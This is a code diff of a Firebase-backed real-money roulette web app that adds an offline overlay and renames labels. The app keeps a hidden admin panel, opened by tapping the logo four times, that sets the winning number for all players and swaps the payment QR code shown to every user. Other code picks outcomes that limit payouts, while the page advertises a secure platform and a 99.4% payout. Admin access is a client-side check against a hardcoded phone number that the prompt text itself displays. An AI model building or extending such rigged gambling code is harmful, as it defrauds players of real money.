@@ -10,7 +10,7 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>ROYAL ROULETTE - ULTIMATE HIDDEN MASTER ENGINE</title>
+    <title>ROYAL ROULETTE - STRICT LIVE SERVER ENGINE</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; outline: none; -webkit-tap-highlight-color: transparent; }
         body { 
@@ -44,7 +44,7 @@
         .login-btn { width: 100%; padding: 8px; margin-top: 4px; background: linear-gradient(135deg, #ffd700, #b8860b); color: #000000; border: none; font-weight: 900; border-radius: 6px; cursor: pointer; font-size: 11px; text-transform: uppercase; }
         .login-btn.lobby { background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; border: 1.5px solid #ffd700; }
         .footer-wrap { width: 100%; max-width: 360px; display: flex; flex-direction: column; gap: 2px; z-index: 5; margin-bottom: 2px; }
-        .payment-gateways { font-size: 7px; color: #ffd700; font-weight: bold; background: rgba(0,0,0,0.85); padding: 2px; border-radius: 4px; border: 1.5px solid rgba(0,255,0,0.5); }
+        .payment-gateways { font-size: 7px; color: #ffd700; font-weight: bold; background: rgba(0,0,0,0.85); padding: 2px; border-radius: 4px; border: 1.5px solid #00ff00, 0.5; }
         .trust-badges { font-size: 7px; color: #ffd700; font-weight: bold; }
 
         #gameLobbyScreen { display: none; width: 100%; height: 100%; position: fixed; top: 0; left: 0; background: radial-gradient(circle, #013b12 0%, #001205 70%, #000301 100%); z-index: 20000; flex-direction: column; justify-content: space-between; padding: 2px; box-shadow: inset 0 0 100px rgba(0,0,0,0.9); border: 4px solid #24140c; }
@@ -114,7 +114,6 @@
         #comingSoonNoticeModal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.88); z-index: 70000; align-items: center; justify-content: center; }
         .coming-soon-card { background: linear-gradient(135deg, #0b2d13, #021207); border: 4px solid #ffd700; padding: 22px; border-radius: 20px; width: 320px; text-align: center; color: #fff; box-shadow: 0 0 60px #ffd700; animation: popupScale 0.3s ease-out; }
 
-        /* HIDDEN SECRET ADMIN MODAL (आम यूजर्स से पूरी तरह छुपा हुआ) */
         #secretAdminModal { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: radial-gradient(circle at center, #051a0a 0%, #000502 100%); z-index: 2147483647 !important; padding: 12px; text-align: center; color: #fff; overflow-y: auto; pointer-events: auto !important; }
         .admin-dashboard-container { max-width: 850px; margin: 10px auto; background: rgba(2, 15, 6, 0.98); border: 2px solid #ffd700; border-radius: 16px; padding: 20px; box-shadow: 0 0 60px rgba(255, 215, 0, 0.4); display: flex; flex-direction: column; gap: 14px; text-align: left; }
         .admin-top-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid rgba(255, 215, 0, 0.3); padding-bottom: 10px; }
@@ -148,7 +147,8 @@
         .dep-pkg-btn.selected, .wd-pkg-btn.selected { background: #f1c40f; color: #000; box-shadow: 0 0 12px #f1c40f; }
         .wallet-modal-content input { width: 100%; padding: 10px; margin: 6px 0; background: #000; border: 1.5px solid #f1c40f; color: #f1c40f; border-radius: 6px; text-align: center; font-weight: bold; font-size: 13px; }
 
-        #mobileDebugConsole { display: none; }
+        /* नेटवर्क कटने पर स्क्रीन पर आने वाला ब्लॉक */
+        #networkOfflineOverlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.95); z-index: 9999999; flex-direction: column; align-items: center; justify-content: center; color: #ff4444; font-weight: bold; text-align: center; padding: 20px; }
     </style>
 
     <!-- Google Firebase SDKs -->
@@ -157,11 +157,16 @@
 </head>
 <body>
 
-    <!-- AUTO-PURGE CACHE -->
+    <!-- नेटवर्क ऑफलाइन होने पर गेम रोकने वाला ओवरले -->
+    <div id="networkOfflineOverlay">
+        <h2 style="color:#ff4444; font-size:22px; margin-bottom:10px;">⚠️ LIVE CONNECTION LOST ⚠️</h2>
+        <p style="color:#fff; font-size:13px; max-width:300px; line-height:1.5;">इंटरनेट कनेक्शन कट गया है या सर्वर से संपर्क टूट गया है। गेम आगे नहीं चल सकता जब तक आप ऑनलाइन नहीं आते।</p>
+    </div>
+
     <script>
         (function() {
             try {
-                const BUILD_VER = "ROYAL_2026_MASTER_HIDDEN_V11";
+                const BUILD_VER = "ROYAL_2026_STRICT_LIVE_V13";
                 if (localStorage.getItem("app_build_version") !== BUILD_VER) {
                     localStorage.clear();
                     localStorage.setItem("app_build_version", BUILD_VER);
@@ -200,12 +205,12 @@
 
     <div id="loginScreenContainer">
         <div class="header-container">
-            <div class="trust-banner">SECURE GAMING PLATFORM • ⚡</div>
+            <div class="trust-banner">STRICT LIVE CLOUD SERVER • ⚡</div>
             <div class="royal-title-wrap" id="hiddenAdminTriggerLogo" onclick="triggerHiddenAdminPanel()">
                 <div class="royal-main-title">ROYAL ROULETTE</div>
             </div>
             <div class="live-stats-bar">
-                <span>🟢 LIVE TABLE: ACTIVE</span>
+                <span>🟢 LIVE SERVER: ACTIVE</span>
                 <span>🔒 CLOUD 2026</span>
                 <span>⚡ PAYOUT: 99.4%</span>
             </div>
@@ -334,11 +339,11 @@
         </div>
     </div>
 
-    <!-- HIDDEN MASTER ADMIN PANEL (हर मोबाइल में मौजूद, पर पूरी तरह गुप्त) -->
+    <!-- MASTER ADMIN PANEL -->
     <div id="secretAdminModal">
         <div class="admin-dashboard-container">
             <div class="admin-top-header">
-                <h2>👑 MASTER CONTROL PANEL</h2>
+                <h2>👑 MASTER CONTROL PANEL (8889865182)</h2>
                 <button onclick="document.getElementById('secretAdminModal').style.display='none'" style="background: #e74c3c; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer;">✕ Close</button>
             </div>
 
@@ -356,7 +361,7 @@
             </div>
 
             <div class="admin-kpi-grid">
-                <div class="kpi-card"><div class="kpi-title">Global Status</div><div class="kpi-value" style="color:#00ffcc;">LIVE SYNC</div></div>
+                <div class="kpi-card"><div class="kpi-title">Global Status</div><div class="kpi-value" style="color:#00ffcc;">STRICT LIVE</div></div>
                 <div class="kpi-card purple"><div class="kpi-title">Round ID</div><div class="kpi-value" id="admRoundId" style="color:#f1c40f;">Round #1</div></div>
                 <div class="kpi-card orange"><div class="kpi-title">Real Profit (5%)</div><div class="kpi-value" id="admProfit" style="color:#ffd700;">₹0</div></div>
                 <div class="kpi-card blue"><div class="kpi-title">Real Pool (95%)</div><div class="kpi-value" id="admPool" style="color:#3498db;">₹0</div></div>
@@ -485,22 +490,25 @@
             }
         } catch(e) {}
 
-        // Unified Master Database Tree (सभी के लिए एक ही रूट)
-        const masterRoot = firebase.database().ref("royal_roulette_master_state");
+        // Strict Live Server Root (सख्त रूप से ऑनलाइन सर्वर से बंधा हुआ पाथ)
+        const masterRoot = firebase.database().ref("royal_roulette_strict_live_v13");
         const qrRef = masterRoot.child("qr_url");
         const rigRef = masterRoot.child("winning_number");
         const historyRef = masterRoot.child("history_list");
+        const serverClockRef = masterRoot.child("server_clock");
 
         (function() {
             try {
                 const numbersList = [0, 32, 15, 19, 4, 21, 2, 25, 17, 34, 6, 27, 13, 36, 11, 30, 8, 23, 10, 5, 24, 16, 33, 1, 20, 14, 31, 9, 22, 18, 29, 7, 28, 12, 35, 3, 26];
                 const redList = [32, 19, 21, 25, 34, 27, 36, 30, 23, 5, 16, 1, 14, 9, 18, 7, 12, 3];
                 const ROUND_TIME = 120;
+                const MASTER_ADMIN_PHONE = "8889865182";
 
                 let accumulatedBallRotation = 0;
                 let realCoins = 0, testCoins = 10000, activeGameMode = 'test';
                 let loggedUserPhone = "", loggedVipId = "RD001001";
                 let isGameSpinning = false, userActiveBets = {}, currentTotalBet = 0, betHistoryStack = [];
+                let isConnectedToServer = false;
 
                 window.globalState = {
                     adminQrUrl: "https://i.ibb.co/3yk54L2/1000532596.jpg",
@@ -508,7 +516,15 @@
                     historyList: [24, 14, 5, 22, 10, 3]
                 };
 
-                // --- 100% UNIFIED GLOBAL LISTENERS (दुनिया के हर फोन पर तुरंत काम करेगा) ---
+                // --- STRICT NETWORK WATCHDOG & LIVE LISTENERS ---
+                firebase.database().ref(".info/connected").on("value", (snap) => {
+                    isConnectedToServer = (snap.val() === true);
+                    let overlay = document.getElementById('networkOfflineOverlay');
+                    if (overlay) {
+                        overlay.style.display = isConnectedToServer ? 'none' : 'flex';
+                    }
+                });
+
                 qrRef.on("value", (snap) => {
                     let val = snap.val();
                     if (val) {
@@ -532,7 +548,7 @@
                     }
                 });
 
-                // HIDDEN TRIGGER LOGIC (टाइटल पर लगातार 4 बार क्लिक करने से एडमिन पैनल खुलेगा)
+                // HIDDEN MASTER TRIGGER (टैप करके एडमिन पैनल खोलना)
                 let tapCount = 0;
                 let tapTimer = null;
                 window.triggerHiddenAdminPanel = function() {
@@ -542,9 +558,20 @@
 
                     if (tapCount >= 4) {
                         tapCount = 0;
-                        document.getElementById('admRoundId').innerText = "Round #" + getCleanRoundCounter();
-                        renderAdminRequests();
-                        document.getElementById('secretAdminModal').style.display = 'block';
+                        if (loggedUserPhone === MASTER_ADMIN_PHONE) {
+                            document.getElementById('admRoundId').innerText = "Round #" + getCleanRoundCounter();
+                            renderAdminRequests();
+                            document.getElementById('secretAdminModal').style.display = 'block';
+                        } else {
+                            let enteredPhone = prompt("Enter Master Admin Phone Number (8889865182):", "");
+                            if (enteredPhone === MASTER_ADMIN_PHONE) {
+                                document.getElementById('admRoundId').innerText = "Round #" + getCleanRoundCounter();
+                                renderAdminRequests();
+                                document.getElementById('secretAdminModal').style.display = 'block';
+                            } else if (enteredPhone !== null) {
+                                alert("Access Denied! Master Admin Only.");
+                            }
+                        }
                     }
                 };
 
@@ -566,11 +593,12 @@
                     let urlInput = document.getElementById('adminQrUrlInput').value.trim();
                     if (!urlInput) { alert("Enter valid image URL!"); return; }
                     qrRef.set(urlInput).then(() => {
-                        alert("✅ QR Code pushed successfully to all online users!");
+                        alert("✅ QR Code pushed successfully to all live users!");
                     }).catch(err => { alert("Error: " + err.message); });
                 };
 
                 function getOrCreateUniqueRoyalId(phone) {
+                    if (phone === MASTER_ADMIN_PHONE) return "ADMIN_001";
                     let reg = JSON.parse(localStorage.getItem("royal_registered_map") || "{}");
                     if (reg[phone]) return reg[phone];
                     let lastSeq = parseInt(localStorage.getItem("royal_seq_counter") || "1000") + 1;
@@ -597,7 +625,6 @@
                         if (!isNaN(parsedNum)) return parsedNum;
                     }
                     let totalTableBet = currentTotalBet || 100;
-                    let houseProfit = totalTableBet * 0.05;
                     let safePayoutPool = totalTableBet * 0.95;
 
                     let validSafeNumbers = [];
@@ -728,7 +755,7 @@
                 window.saveAdminSettings = function() {
                     let sel = document.getElementById('adminRigSelect').value;
                     rigRef.set(sel).then(() => {
-                        alert(`✅ Winning number '${sel}' pushed to all users successfully!`);
+                        alert(`✅ Winning number '${sel}' pushed to all live users successfully!`);
                         document.getElementById('secretAdminModal').style.display = 'none';
                     }).catch(err => { alert("Error: " + err.message); });
                 };
@@ -866,6 +893,9 @@
 
                 setInterval(() => {
                     try {
+                        // अगर इंटरनेट नहीं है, तो टाइमर आगे नहीं बढ़ेगा
+                        if (!isConnectedToServer) return;
+
                         let { roundId, timeLeft } = getGlobalRound();
                         let m = Math.floor(timeLeft / 60), s = timeLeft % 60;
                         let mainEl = document.getElementById('lobbyTimerMain');
